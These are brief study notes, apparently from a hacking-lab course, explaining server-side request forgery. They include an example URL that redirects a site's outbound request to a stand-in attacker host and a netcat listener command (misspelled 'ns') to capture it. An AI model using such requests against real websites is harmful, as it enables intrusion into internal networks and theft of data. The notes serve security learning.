Server-Side Request Forgery

where an attacker can force a web application to send requests on its behalf to arbitrary destinations, 
while having control over the content of the request itself. 

SSRF vulnerabilities often arise from implementations where our web application must use third-party services


-The attacker would only need to make the following request to your website:

    https://www.mysite.com/sms?server=attacker-MachineIp.thm&msg=ABC

-This would make the vulnerable web application make a request to:

    https://attacker.thm/api/send?msg=ABC 

-You could then just capture the contents of the request using Netcat:

    ns -lvp 80

SSRF can be used for:

Enumerate internal networks, including IP addresses and ports.
Abuse trust relationships between servers and gain access to otherwise restricted services.
Interact with some non-HTTP services to get remote code execution (RCE).
